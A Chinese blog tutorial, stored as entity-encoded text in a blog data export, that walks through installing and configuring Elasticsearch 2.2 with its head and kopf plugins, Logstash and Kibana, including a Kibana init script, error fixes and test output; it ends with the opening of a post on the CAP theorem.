[/usr/local/elasticsearch-2.2.0/plugins] does not exist. Creating...Trying https://github.com/mobz/elasticsearch-head/archive/master.zip ...Downloading ..................................DONEVerifying https://github.com/mobz/elasticsearch-head/archive/master.zip checksums if available ...NOTE: Unable to verify checksum for downloaded plugin (unable to find .sha1 or .md5 file to verify)Installed head into /usr/local/elasticsearch-2.2.0/plugins/head &#x67E5;&#x770B;&#xFF1A;123#ll plugins/total 4drwxr-xr-x 5 root root 4096 Mar 29 18:09 head &#x5B89;&#x88C5;elasticsearch&#x7684;kopf&#x63D2;&#x4EF6;&#x6CE8;&#xFF1A;Elasticsearch-kopf&#x63D2;&#x4EF6;&#x53EF;&#x4EE5;&#x67E5;&#x8BE2;Elasticsearch&#x4E2D;&#x7684;&#x6570;&#x636E;1234567#./bin/plugin install lmenezes/elasticsearch-kopf-&gt; Installing lmenezes/elasticsearch-kopf...Trying https://github.com/lmenezes/elasticsearch-kopf/archive/master.zip ...Downloading ..................................DONEVerifying https://github.com/lmenezes/elasticsearch-kopf/archive/master.zip checksums if available ...NOTE: Unable to verify checksum for downloaded plugin (unable to find .sha1 or .md5 file to verify)Installed kopf into /usr/local/elasticsearch-2.2.0/plugins/kopf &#x67E5;&#x770B;1234#ll plugins/total 8drwxr-xr-x 5 search search 4096 Mar 29 18:09 headdrwxrwxr-x 8 search search 4096 Mar 30 18:10 kopf &#x521B;&#x5EFA;elasticsearch&#x7684;data&#x548C;logs&#x76EE;&#x5F55;12mkdir /elasticsearch/data -pvmkdir /elasticsearch/logs -pv &#x7F16;&#x8F91;elasticsearch&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;1234567891011121314cd config#&#x5907;&#x4EFD;&#x4E00;&#x4E0B;cp elasticsearch.yml elasticsearch.yml_back#&#x5728;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x51E0;&#x884C;vim elasticsearch.yml #cluster.name: es_cluster#node.name: node-1#path.data: /elasticsearch/data#path.logs: /elasticsearch/logs#network.host: 10.0.90.24 #network.port: 9200 &#x542F;&#x52A8;elasticsearch1234567#./bin/elasticsearchException in thread &quot;main&quot; java.lang.RuntimeException: don&apos;t run elasticsearch as root. at org.elasticsearch.bootstrap.Bootstrap.initializeNatives(Bootstrap.java:93) at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:144) at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:285) at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:35)Refer to the log for complete error details. &#x63D0;&#x793A;&#x4E0D;&#x80FD;&#x4EE5;root&#x7528;&#x6237;&#x542F;&#x52A8;&#xFF0C;&#x6240;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7528;&#x6237;&#xFF0C;&#x4EE5;&#x666E;&#x901A;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x542F;&#x52A8;elasticsearch12345#groupadd search#useradd -g search search&#x5C06;data&#x548C;logs&#x76EE;&#x5F55;&#x7684;&#x5C5E;&#x4E3B;&#x548C;&#x5C5E;&#x7EC4;&#x6539;&#x4E3A;search#chown search.search /elasticsearch/ -R &#x91CD;&#x65B0;&#x542F;&#x52A8;123456789101112131415161718192021#./bin/elasticsearch[2016-03-29 19:58:20,026][WARN ][bootstrap ] unable to install syscall filter: seccomp unavailable: requires kernel 3.5+ with CONFIG_SECCOMP and CONFIG_SECCOMP_FILTER compiled inException in thread &quot;main&quot; java.lang.IllegalStateException: Unable to access &apos;path.scripts&apos; (/usr/local/elasticsearch-2.2.0/config/scripts)Likely root cause: java.nio.file.AccessDeniedException: /usr/local/elasticsearch-2.2.0/config/scripts at sun.nio.fs.UnixException.translateToIOException(UnixException.java:84) at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102) at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107) at sun.nio.fs.UnixFileSystemProvider.createDirectory(UnixFileSystemProvider.java:384) at java.nio.file.Files.createDirectory(Files.java:674) at java.nio.file.Files.createAndCheckIsDirectory(Files.java:781) at java.nio.file.Files.createDirectories(Files.java:767) at org.elasticsearch.bootstrap.Security.ensureDirectoryExists(Security.java:337) at org.elasticsearch.bootstrap.Security.addPath(Security.java:314) at org.elasticsearch.bootstrap.Security.addFilePermissions(Security.java:248) at org.elasticsearch.bootstrap.Security.createPermissions(Security.java:212) at org.elasticsearch.bootstrap.Security.configure(Security.java:118) at org.elasticsearch.bootstrap.Bootstrap.setupSecurity(Bootstrap.java:196) at org.elasticsearch.bootstrap.Bootstrap.setup(Bootstrap.java:167) at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:285) at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:35)Refer to the log for complete error details. &#x62A5;&#x4EE5;&#x4E0A;&#x9519;&#x8BEF;&#xFF0C;&#x539F;&#x56E0;&#x662F;&#x6743;&#x9650;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4FEE;&#x6539;&#x6743;&#x9650;1#chown search.search /usr/local/elasticsearch-2.2.0 -R &#x7136;&#x540E;&#x5207;&#x6362;&#x5230;search&#x7528;&#x6237;&#x542F;&#x52A8;elasticsearch1234567891011121314151617181920212223#su - search$cd /usr/local/elasticsearch-2.2.0$./bin/elasticsearch[2016-03-29 20:11:20,243][WARN ][bootstrap ] unable to install syscall filter: seccomp unavailable: requires kernel 3.5+ with CONFIG_SECCOMP and CONFIG_SECCOMP_FILTER compiled in[2016-03-29 20:11:20,409][INFO ][node ] [node-1] version[2.2.0], pid[2359], build[8ff36d1/2016-01-27T13:32:39Z][2016-03-29 20:11:20,409][INFO ][node ] [node-1] initializing ...[2016-03-29 20:11:21,102][INFO ][plugins ] [node-1] modules [lang-expression, lang-groovy], plugins [head], sites [head][2016-03-29 20:11:21,118][INFO ][env ] [node-1] using [1] data paths, mounts [[/ (/dev/sda3)]], net usable_space [24.5gb], net total_space [27.2gb], spins? [possibly], types [ext4][2016-03-29 20:11:21,118][INFO ][env ] [node-1] heap size [1007.3mb], compressed ordinary object pointers [true][2016-03-29 20:11:22,541][INFO ][node ] [node-1] initialized[2016-03-29 20:11:22,542][INFO ][node ] [node-1] starting ...[2016-03-29 20:11:22,616][INFO ][transport ] [node-1] publish_address {10.0.90.24:9300}, bound_addresses {10.0.90.24:9300}[2016-03-29 20:11:22,636][INFO ][discovery ] [node-1] es_cluster/yNJhglX4RF-ydC4CWpFyTA[2016-03-29 20:11:25,732][INFO ][cluster.service ] [node-1] new_master {node-1}{yNJhglX4RF-ydC4CWpFyTA}{10.0.90.24}{10.0.90.24:9300}, reason: zen-disco-join(elected_as_master, [0] joins received)[2016-03-29 20:11:25,769][INFO ][http ] [node-1] publish_address {10.0.90.24:9200}, bound_addresses {10.0.90.24:9200}[2016-03-29 20:11:25,770][INFO ][node ] [node-1] started[2016-03-29 20:11:25,788][INFO ][gateway ] [node-1] recovered [0] indices into cluster_state#&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BA9;elasticsearch&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;$./bin/elasticsearch &amp;#&#x6216;&#x8005;&#x4E0D;&#x4E2D;&#x65AD;&#x542F;&#x52A8;&#xFF08;&#x6211;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x542F;&#x52A8;&#xFF09;$nohup /usr/local/elasticsearch-2.2.0/bin/elasticsearch &amp; &#x67E5;&#x770B;&#x542F;&#x52A8;&#x662F;&#x5426;&#x6210;&#x529F;123456789# netstat -tunlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 950/sshd tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1027/master tcp 0 0 ::ffff:10.0.90.24:9300 :::* LISTEN 2428/java tcp 0 0 :::22 :::* LISTEN 950/sshd tcp 0 0 ::1:25 :::* LISTEN 1027/master tcp 0 0 ::ffff:10.0.90.24:9200 :::* LISTEN 2428/java &#x5728;&#x6D4F;&#x89C8;&#x5668;&#x542F;&#x52A8;&#x67E5;&#x770B;12345678910111213http://10.0.90.24:9200/ --&#x4F1A;&#x663E;&#x793A;&#x5982;&#x4E0B;&#xFF1A;{ &quot;name&quot; : &quot;node-1&quot;, &quot;cluster_name&quot; : &quot;es_cluster&quot;, &quot;version&quot; : { &quot;number&quot; : &quot;2.2.0&quot;, &quot;build_hash&quot; : &quot;8ff36d139e16f8720f2947ef62c8167a888992fe&quot;, &quot;build_timestamp&quot; : &quot;2016-01-27T13:32:39Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;5.4.1&quot; }, &quot;tagline&quot; : &quot;You Know, for Search&quot;} &#x8FD4;&#x56DE;&#x7684;&#x4FE1;&#x606F;&#x5C55;&#x793A;&#x4E86;&#x914D;&#x7F6E;&#x7684;cluster_name&#x548C;name&#xFF0C;&#x4EE5;&#x53CA;&#x5B89;&#x88C5;&#x7684;ES&#x7684;&#x7248;&#x672C;&#x7B49;&#x4FE1;&#x606F;&#x3002; &#x81F3;&#x4E8E;&#x4E4B;&#x524D;&#x5B89;&#x88C5;&#x7684;head&#x63D2;&#x4EF6;&#xFF0C;&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x8DDF;ES&#x96C6;&#x7FA4;&#x4EA4;&#x4E92;&#x7684;&#x63D2;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x96C6;&#x7FA4;&#x72B6;&#x6001;&#x3001;&#x96C6;&#x7FA4;&#x7684;doc&#x5185;&#x5BB9;&#x3001;&#x6267;&#x884C;&#x641C;&#x7D22;&#x548C;&#x666E;&#x901A;&#x7684;Rest&#x8BF7;&#x6C42;&#x7B49;&#x3002;&#x53EF;&#x4EE5;&#x5982;&#x4E0B;&#x5730;&#x5740; http://ip:9200/_plugin/head &#x67E5;&#x770B;ES&#x96C6;&#x7FA4;&#x72B6;&#x6001;&#xFF1A; &#x5B89;&#x88C5;Logstash&#x5B89;&#x88C5;1234#tar xf kibana-4.4.0-linux-x64.tar.gz -C /usr/local/#cd /usr/local/#mv kibana-4.4.0-linux-x64/ kibana &#x4E3A;kibana&#x63D0;&#x4F9B;SysV&#x5F62;&#x5F0F;&#x7684;&#x542F;&#x52A8;&#x811A;&#x672C;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798vim /etc/init.d/kibana#!/bin/bash### BEGIN INIT INFO# Provides: kibana# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Runs kibana daemon# Description: Runs the kibana daemon as a non-root user### END INIT INFO# Process nameNAME=kibanaDESC=&quot;Kibana4&quot;PROG=&quot;/etc/init.d/kibana&quot;# Configure location of Kibana binKIBANA_BIN=/usr/local/kibana/bin# PID InfoPID_FOLDER=/var/run/kibana/PID_FILE=/var/run/kibana/$NAME.pidLOCK_FILE=/var/lock/subsys/$NAMEPATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BINDAEMON=$KIBANA_BIN/$NAME# Configure User to run daemon processDAEMON_USER=root# Configure logging locationKIBANA_LOG=/var/log/kibana.log# Begin ScriptRETVAL=0if [ `id -u` -ne 0 ]; then echo &quot;You need root privileges to run this script&quot; exit 1fi# Function library. /etc/init.d/functionsstart() { echo -n &quot;Starting $DESC : &quot;pid=`pidofproc -p $PID_FILE kibana` if [ -n &quot;$pid&quot; ] ; then echo &quot;Already running.&quot; exit 0 else # Start Daemonif [ ! -d &quot;$PID_FOLDER&quot; ] ; then mkdir $PID_FOLDER fidaemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;&quot;$KIBANA_LOG&quot; 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failureecho [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi}reload(){ echo &quot;Reload command is not implemented for this service.&quot; return $RETVAL}stop() { echo -n &quot;Stopping $DESC : &quot; killproc -p $PID_FILE $DAEMON RETVAL=$?echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE}case &quot;$1&quot; in start) start;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload)reload;; *)# Invalid Arguments, print the following message. echo &quot;Usage: $0 {start|stop|status|restart}&quot; &gt;&amp;2exit 2 ;;esac 12&#x6DFB;&#x52A0;&#x6267;&#x884C;&#x6743;&#x9650;#chmod +x /etc/init.d/kibana 12345678910111213141516171819&#x542F;&#x52A8;kibana#service kibana startStarting Kibana4 : [ OK ]&#x67E5;&#x770B;&#x662F;&#x5426;&#x542F;&#x52A8;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x4E0B;&#x8868;&#x793A;&#x542F;&#x52A8;&#x6210;&#x529F;#netstat -tunlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 950/sshd tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1027/master tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 2909/node --kibana&#x7AEF;&#x53E3; tcp 0 0 ::ffff:10.0.90.24:9300 :::* LISTEN 2428/java tcp 0 0 :::22 :::* LISTEN 950/sshd tcp 0 0 ::1:25 :::* LISTEN 1027/master tcp 0 0 ::ffff:10.0.90.24:9200 :::* LISTEN 2428/java &#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;#chkconfig --add kibana#chkconfig kibana on &#x5B89;&#x88C5;KibanaKibana&#x4E00;&#x4E2A;&#x6536;&#x96C6;&#x5668;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E3A;&#x5B83;&#x6307;&#x5B9A;Input&#x548C;Output&#xFF08;Input&#x548C;Output&#x53EF;&#x4EE5;&#x4E3A;&#x591A;&#x4E2A;&#xFF09;&#x3002; 123#tar xf logstash-2.2.0.tar.gz -C /usr/local/#cd /usr/local/#mv logstash-2.2.0 logstash &#x6D4B;&#x8BD5;logstash&#xFF0C;&#x4F60;&#x4F1A;&#x53D1;&#x73B0;&#x8F93;&#x5165;&#x4EC0;&#x4E48;&#x5185;&#x5BB9;&#xFF0C;logstash&#x6309;&#x7167;&#x67D0;&#x79CD;&#x683C;&#x5F0F;&#x8F93;&#x51FA;&#x4EC0;&#x4E48;&#x5185;&#x5BB9;123456#/usr/local/logstash/bin/logstash -e &apos;input { stdin{} } output { stdout {} }&apos; Settings: Default pipeline workers: 2Logstash startup completedhello world ---&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;2016-04-01T09:05:35.818Z elk hello world &#x6CE8;&#xFF1A;&#x5176;&#x4E2D;-e&#x53C2;&#x6570;&#x5141;&#x8BB8;Logstash&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x884C;&#x63A5;&#x53D7;&#x8BBE;&#x7F6E;&#x3002;&#x8FD9;&#x70B9;&#x5C24;&#x5176;&#x5FEB;&#x901F;&#x7684;&#x5E2E;&#x52A9;&#x6211;&#x4EEC;&#x53CD;&#x590D;&#x7684;&#x6D4B;&#x8BD5;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;&#x800C;&#x4E0D;&#x7528;&#x5199;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x4F7F;&#x7528;CTRL-C&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x9000;&#x51FA;&#x4E4B;&#x524D;&#x8FD0;&#x884C;&#x7684;Logstash&#x3002; &#x4F7F;&#x7528;-e&#x53C2;&#x6570;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#x6307;&#x5B9A;&#x914D;&#x7F6E;&#x662F;&#x5F88;&#x5E38;&#x7528;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0D;&#x8FC7;&#x5982;&#x679C;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x66F4;&#x591A;&#x8BBE;&#x7F6E;&#x5219;&#x9700;&#x8981;&#x5F88;&#x957F;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x6307;&#x5B9A;logstash&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002; &#x6CE8;&#xFF1A;logstash &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;https://www.elastic.co/guide/en/logstash/current/configuration-file-structure.htmllogstash&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x662F;&#x4EE5;json&#x683C;&#x5F0F;&#x8BBE;&#x7F6E;&#x53C2;&#x6570;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4F4D;&#x4E8E;/etc/logstash/conf.d&#x76EE;&#x5F55;&#xFF08;rpm&#x5B89;&#x88C5;&#x7684;&#x8DEF;&#x5F84;&#xFF09;&#x4E0B;&#x914D;&#x7F6E;&#x5305;&#x62EC;&#x4E09;&#x4E2A;&#x90E8;&#x5206;&#x8F93;&#x5165;&#x7AEF;&#x3001;&#x8FC7;&#x6EE4;&#x5668;&#x548C;&#x8F93;&#x51FA;&#x3002; &#x683C;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;12345678910111213# This is a comment. You should use comments to describe# parts of your configuration.input { ...}filter { ...}output { ...} &#x63D2;&#x4EF6;&#x914D;&#x7F6E;&#x683C;&#x5F0F;&#xFF1A;1234567891011input { file { path =&gt; &quot;/var/log/messages&quot; type =&gt; &quot;syslog&quot; } file { path =&gt; &quot;/var/log/apache/access.log&quot; type =&gt; &quot;apache&quot; }} &#x9996;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;1234567#cd /usr/local/logstash/config#cat logstash-simple.conf input { stdin { } }output { stdout { codec =&gt; rubydebug }} &#x5148;&#x8F93;&#x51FA;&#x4E00;&#x4E9B;&#x5185;&#x5BB9;&#xFF0C;&#x4F8B;&#x5982;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#xFF1A;12#echo &quot;`date` hello world&quot;Fri Apr 1 17:07:17 CST 2016 hello world &#x6267;&#x884C;123#/usr/local/logstash/bin/logstash agent -f logstash-simple.confSettings: Default pipeline workers: 2Logstash startup completed 12345678# &#x5C06;&#x521A;&#x624D;&#x751F;&#x6210;&#x7684;&#x65F6;&#x95F4;&#x4FE1;&#x606F;&#x7C98;&#x8D34;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x56DE;&#x8F66;&#xFF0C;&#x5C31;&#x4F1A;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x4FE1;&#x606F;&#xFF1A;Fri Apr 1 17:07:17 CST 2016 hello world{ &quot;message&quot; =&gt; &quot;Tue Jul 14 18:07:07 EDT 2015 hello World&quot;, &quot;@version&quot; =&gt; &quot;1&quot;, &quot;@timestamp&quot; =&gt; &quot;2016-04-01T09:08:19.809Z&quot;, &quot;host&quot; =&gt; &quot;elk&quot;} &#x63A5;&#x4E0B;&#x6765;&#x5728;logstash&#x7684;&#x5B89;&#x88C5;&#x76EE;&#x5F55;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;logstash&#x4F7F;&#x7528;elasticsearch&#x4F5C;&#x4E3A;logstash&#x7684;&#x540E;&#x7AEF;&#x8F93;&#x51FA;&#x7684;&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;logstash-es-test.conf&#x8BE5;&#x6587;&#x4EF6;&#x4E2D;&#x5B9A;&#x4E49;&#x4E86;stdout&#x548C;elasticsearch&#x4F5C;&#x4E3A;output&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x201C;&#x591A;&#x91CD;&#x8F93;&#x51FA;&#x201D;&#x5373;&#x4FDD;&#x8BC1;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x663E;&#x793A;&#x5230;&#x5C4F;&#x5E55;&#x4E0A;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x8F93;&#x51FA;&#x5230;elastisearch&#x4E2D;&#x3002;&#x5982;&#x4E0B;&#xFF1A;123456#cat logstash-es-test.conf input { stdin { } }output { elasticsearch {hosts =&gt; &quot;10.0.90.24&quot; } stdout { codec=&gt; rubydebug }} &#x6D4B;&#x8BD5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x6B63;&#x786E;12/usr/local/logstash/bin/logstash --configtest -f logstash-es-test.conf Configuration OK &#x5982;&#x679C;&#x6587;&#x4EF6;&#x6BD4;&#x8F83;&#x591A;&#x4E5F;&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#xFF1A;1/usr/local/logstash/bin/logstash --configtest -f config/*.conf &#x6267;&#x884C;&#xFF1A;123/usr/local/logstash/bin/logstash agent -f logstash-es-test.conf Settings: Default pipeline workers: 2Logstash startup completed 12345678# &#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#xFF0C;&#x56DE;&#x8F66;hello logstash{ &quot;message&quot; =&gt; &quot;hello logstash&quot;, &quot;@version&quot; =&gt; &quot;1&quot;, &quot;@timestamp&quot; =&gt; &quot;2016-04-01T09:18:26.967Z&quot;, &quot;host&quot; =&gt; &quot;elk&quot;} Ctrl+c &#x7ED3;&#x675F;&#x6267;&#x884C;&#xFF01; &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;curl&#x547D;&#x4EE4;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x6765;&#x67E5;&#x770B;ES&#x662F;&#x5426;&#x63A5;&#x6536;&#x5230;&#x4E86;&#x6570;&#x636E;&#xFF1A;12345678910111213141516171819202122232425262728293031323334#curl &apos;http://10.0.90.24:9200/_search?pretty&apos;{ &quot;took&quot; : 4, &quot;timed_out&quot; : false, &quot;_shards&quot; : { &quot;total&quot; : 6, &quot;successful&quot; : 6, &quot;failed&quot; : 0 }, &quot;hits&quot; : { &quot;total&quot; : 5, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ { &quot;_index&quot; : &quot;.kibana&quot;, &quot;_type&quot; : &quot;config&quot;, &quot;_id&quot; : &quot;4.4.0&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : { &quot;buildNum&quot; : 9689 } }, { &quot;_index&quot; : &quot;logstash-2016.04.01&quot;, &quot;_type&quot; : &quot;logs&quot;, &quot;_id&quot; : &quot;AVPRHddUspScKx_yDLKx&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : { &quot;message&quot; : &quot;hello logstash&quot;, &quot;@version&quot; : &quot;1&quot;, &quot;@timestamp&quot; : &quot;2016-04-01T09:18:26.967Z&quot;, &quot;host&quot; : &quot;elk&quot; } }] }} &#x901A;&#x8FC7;&#x4EE5;&#x4E0A;&#x663E;&#x793A;&#x4FE1;&#x606F;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;ES&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;&#x6570;&#x636E;&#xFF01;&#x8BF4;&#x660E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Elasticsearch&#x548C;Logstash&#x6765;&#x6536;&#x96C6;&#x65E5;&#x5FD7;&#x6570;&#x636E;&#x4E86;&#x3002; &#x4FEE;&#x6539;kibana&#x7AEF;&#x53E3;123456789101112131415#cd /usr/local/kibana/config&#x5907;&#x4EFD;&#x914D;&#x7F6E;#cp kibana.yml kibana.yml_back&#x4FEE;&#x6539;&#x4E3A;&#x5982;&#x4E0B;&#xFF1A;&#x5176;&#x4ED6;&#x9ED8;&#x8BA4;&#x4E0D;&#x53D8;server.port: 80 --&#x4FEE;&#x6539;&#x7AEF;&#x53E3;&#x4E3A;80&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;5601server.host: &quot;10.0.90.24&quot;elasticsearch.url: &quot;http://10.0.90.24:9200&quot; --ip&#x4E3A;server&#x7684;ip&#x5730;&#x5740;kibana.defaultAppId: &quot;discover&quot;elasticsearch.requestTimeout: 300000elasticsearch.shardTimeout: 0&#x91CD;&#x542F;kibana#service kibana restart &#x5728;&#x6D4F;&#x89C8;&#x5668;&#x8BBF;&#x95EE;kibana&#x7684;&#x5730;&#x5740; http://10.0.90.24 &#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;kibana&#x7684;&#x9875;&#x9762;&#x4E86;&#x3002; &#x767B;&#x5F55;&#x4E4B;&#x540E;&#xFF0C;&#x9996;&#x5148;&#x914D;&#x7F6E;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#xFF0C;&#x9ED8;&#x8BA4;kibana&#x7684;&#x6570;&#x636E;&#x88AB;&#x6307;&#x5411;Elasticsearch&#xFF0C;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x7684;logstash-*&#x7684;&#x7D22;&#x5F15;&#x540D;&#x79F0;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#xFF08;@timestamp&#xFF09;&#x7684;&#xFF0C;&#x5982;&#x4E0B; &#x70B9;&#x51FB;&#x201C;Create&#x201D;&#xFF0C;&#x5982;&#x679C;&#x80FD;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x7C7B;&#x4F3C;&#x754C;&#x9762;&#xFF0C;&#x8BF4;&#x660E;&#x7D22;&#x5F15;&#x521B;&#x5EFA;&#x5B8C;&#x6210;&#x3002; &#x70B9;&#x51FB;&#x201C;Discover&#x201D;&#xFF0C;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x548C;&#x6D4F;&#x89C8;Elasticsearch&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x9ED8;&#x8BA4;&#x641C;&#x7D22;&#x7684;&#x662F;&#x6700;&#x8FD1;15&#x5206;&#x949F;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x9009;&#x62E9;&#x65F6;&#x95F4;&#x3002;&#x5230;&#x6B64;&#xFF0C;&#x8BF4;&#x660E;&#x4F60;&#x7684;ELK&#x5E73;&#x53F0;&#x5B89;&#x88C5;&#x90E8;&#x7F72;&#x5B8C;&#x6210;&#x3002;","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"elk","slug":"elk","permalink":"http://www.wangxin123.com/tags/elk/"}]},{"title":"CAP原理、一致性模型、BASE理论和ACID特性","slug":"CAP原理、一致性模型、BASE理论和ACID特性","date":"2016-10-21T14:10:00.000Z","updated":"2016-11-18T13:19:38.745Z","comments":true,"path":"2016/10/21/CAP原理、一致性模型、BASE理论和ACID特性/","link":"","permalink":"http://www.wangxin123.com/2016/10/21/CAP原理、一致性模型、BASE理论和ACID特性/","excerpt":"CAP&#x539F;&#x7406;&#x5728;&#x7406;&#x8BBA;&#x8BA1;&#x7B97;&#x673A;&#x79D1;&#x5B66;&#x4E2D;&#xFF0C;CAP&#x5B9A;&#x7406;&#xFF08;CAP theorem&#xFF09;&#xFF0C;&#x53C8;&#x88AB;&#x79F0;&#x4F5C;&#x5E03;&#x9C81;&#x5C14;&#x5B9A;&#x7406;&#xFF08;Brewer&#x2019;s theorem&#xFF09;&#xFF0C;&#x5B83;&#x6307;&#x51FA;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x540C;&#x65F6;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0B;&#x4E09;&#x70B9;&#xFF1A; &#x4E00;&#x81F4;&#x6027;&#xFF08;Consistence&#xFF09;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5907;&#x4EFD;&#xFF0C;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x662F;&#x5426;&#x540C;&#x6837;&#x7684;&#x503C;&#x3002;&#xFF08;&#x7B49;&#x540C;&#x4E8E;&#x6240;&#x6709;&#x8282;&#x70B9;&#x8BBF;&#x95EE;&#x540C;&#x4E00;&#x4EFD;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x526F;&#x672C;&#xFF09; 